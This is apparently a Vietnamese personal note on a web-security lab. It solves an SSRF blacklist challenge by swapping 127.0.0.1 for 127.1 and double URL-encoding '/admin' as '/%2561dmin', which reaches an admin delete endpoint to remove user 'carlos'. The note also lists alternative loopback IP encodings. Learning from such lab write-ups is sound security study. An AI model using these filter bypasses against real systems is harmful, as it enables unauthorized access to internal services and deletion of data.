![[lab-ssrf-blacklist-bypass.png]]
localhost bị chặn, bypass bằng IP rút gọn + double encode rồi xóa carlos

> [!NOTE] phân tích đề
> - vẫn stockApi tới http://localhost/admin
> - dev chặn 2 lớp:
> 1. chặn host localhost / 127.0.0.1
> 2. chặn path /admin
> - thử 127.0.0.1 => `External stock check blocked`
> -sau khi quan sát gói tin bị chặn này, mình thấy filter chỉ check chuỗi 'localhost/127.0.0.1' trong khi backend vẫn parse đủ kiểu IP rút gọn, nên mình tách 2 lớp ra bypass: host bằng 127.1, path bằng double encode.
> -> đọc thêm ở [[Blacklist filter bypass]] và [[mã hóa url để bypass blacklist]]

### hướng giải
- [ ] thử localhost => bị chặn
- [ ] thử 127.0.0.1 => bị chặn
- [ ] thử 127.1 => qua được lớp host
- [ ] thử 127.1/admin => lại bị chặn lớp path
- [ ] double encode chữ a thành %2561
- [ ] bắn tới /%2561dmin rồi tới link delete

### giải
thử:
```http
stockApi=http://127.0.0.1/
```
-> 400 `External stock check blocked for security reasons`

bypass host:
```http
stockApi=http://127.1/
```
-> 200 OK
=> lọt rồi

thử thêm path:
```http
stockApi=http://127.1/admin
```
-> lại bị chặn

bypass path bằng double encode:
```http
stockApi=http://127.1/%2561dmin
```
-> filter nhìn thấy `%2561` => không phải `admin`
-> backend decode lần 1 => `%61dmin`
-> decode lần 2 => `admin`
-> response trả về HTML admin

lụm link delete rồi bắn:
```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
=> carlos bị xóa
=> lab solved

mấy payload khác mình note để thử khi kẹt:
```
http://2130706433/
http://017700000001/
http://0x7f.0.0.1/
http://0x7f000001/
```

![[lab-ssrf-blacklist-bypass-result.png]]

> [!NOTE] bài học
> - blacklist chuỗi lúc nào cũng bypass được
> - 127.1 = 127.0.0.1 rút gọn, backend vẫn hiểu
> - double encode để đánh lừa decode 1 lần ở filter
> - nên mình luôn test host trước, path sau, tách 2 lớp ra
